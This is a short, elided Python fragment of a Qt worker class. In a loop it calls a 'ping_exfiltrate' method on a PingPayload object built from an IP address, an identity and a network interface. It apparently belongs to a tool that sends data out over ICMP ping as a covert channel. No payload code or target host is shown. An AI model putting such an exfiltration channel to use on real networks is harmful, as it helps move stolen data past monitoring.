...
class Worker(QObject):
    ...
    def __init__(self, binary_ip, identity, selected_interface):
        ...
        self.ping_payload = PingPayload(binary_ip, identity, selected_interface)
    ...
    def task(self):
        ...
        while self.is_running:
            self.ping_payload.ping_exfiltrate(self.binary_ip, self.identity, index, self.rate)
            index += 1
